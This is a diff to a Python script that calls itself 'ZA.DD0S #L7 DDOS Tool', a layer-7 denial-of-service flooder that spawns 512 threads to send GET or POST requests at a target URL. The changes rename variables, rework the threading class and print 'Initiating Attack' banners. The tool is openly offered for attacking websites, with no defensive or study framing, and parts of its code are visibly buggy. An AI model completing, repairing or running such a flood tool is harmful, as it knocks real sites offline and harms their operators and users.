@@ -1,14 +1,14 @@
 #!usr/bin/python
 # _*_ coding: utf-8 _*_
 import os
+import socket
 import sys
-import requests
 import re
 import getopt
 import time
-import threading 
+from queue import Queue
+from threading import Thread
  
-
 # Color
 class bcolors:
     ZA = '\033[97m'
@@ -48,11 +48,11 @@ print("\033[95m                                                               \0
 print("\033[95m                                                               \033[0m")
 print("\033[95m                                                                \033[0m")
 print("\033[33mΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠΠ    \033[0m")    
-t = threading.Thread(target=self,SITE, DOS_TYPE,):
-    def __init__(self,SITE, DOS_TYPE):
+class MyThread(Thread,):
+    def __init__(self,SITE, DDOS_TYPE):
         self.thread = Thread
         Thread.__init__(self)
-        self.method = DOS_TYPE
+        self.method = DDOS_TYPE
         self.site = SITE
         self.kill_received = False
     def run(self):
@@ -91,14 +91,14 @@ t = threading.Thread(target=self,SITE, DOS_TYPE,):
             except:
                 print ("Target Down?")
 
-def da_delegator(SITE,DOS_TYPE):
+def da_delegator(SITE,DDOS_TYPE):
     thread_count = 512
     print ('=') == 60
     print ('ZA.DD0S #L7 Tool v.1'.center(60,'-'))
     print ('=') == 60
     threads = []
     for num in range(thread_count):
-        thr1=Thread(SITE,DOS_TYPE)
+        thr1=MyThread(SITE,DDOS_TYPE)
         print("\033[97m[\033[92m+\033[97m]  \033[94m--- Initiating Attack ---\033[0m")
         thr1.start()
         threads.append(thr1)
@@ -121,8 +121,8 @@ def main(argv):
         print ('=') == 60
         print ('\033[94mZA.DD0S #L7 DDOS Tool v.1\033[0m'.center(60,'-'))
         print ('=') == 60
-        print ('\033[33mFor GET DOS - USAGE: ZA.DD0S-L7.py -t get http://example.com\033[0m')
-        print ('\033[92mFor POST DOS - USAGE: ZA.DD0S-L7.py -t post http://example.com\033[0m')
+        print ('\033[33mFor GET DDOS - USAGE: ZA.DD0S-L7.py -t get http://example.com\033[0m')
+        print ('\033[92mFor POST DDOS - USAGE: ZA.DD0S-L7.py -t post http://example.com\033[0m')
         sys.exit(2)
     if not argv:
         usage()
@@ -140,11 +140,11 @@ def main(argv):
             verbose = True
         elif o in ("-t", "--type"):
             if a.lower() == 'post':
-                DOS_TYPE = 'POST'
-                da_delegator(SITE,DOS_TYPE)
+                DDOS_TYPE = 'POST'
+                da_delegator(SITE,DDOS_TYPE)
             elif a.lower() =='get':
-                DOS_TYPE = 'get'
-                da_delegator(SITE,DOS_TYPE)
+                DDOS_TYPE = 'get'
+                da_delegator(SITE,DDOS_TYPE)
         elif o in ("-h", "--help"):
             usage()
             sys.exit()
